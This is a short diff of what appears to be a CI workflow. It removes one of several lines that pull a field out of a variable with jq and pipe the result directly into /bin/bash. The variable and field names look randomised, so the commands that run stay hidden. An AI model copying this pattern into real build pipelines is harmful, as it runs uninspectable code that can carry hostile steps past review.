@@ -32,7 +32,6 @@ jobs:
           echo $cqgp253 | jq -r .hhis38 | /bin/bash
           printf '%s' "$yt714" | jq -r .desbb37004 | /bin/bash
           echo $sjwg58 | jq -r .b3252 | /bin/bash
-          echo $l981 | jq -r .bfga53454 | /bin/bash
           printf '%s' "$l80414" | jq -r .akeg4 | /bin/bash
           printf '%s' "$zlnky466" | jq -r .atjlz042 | /bin/bash
 
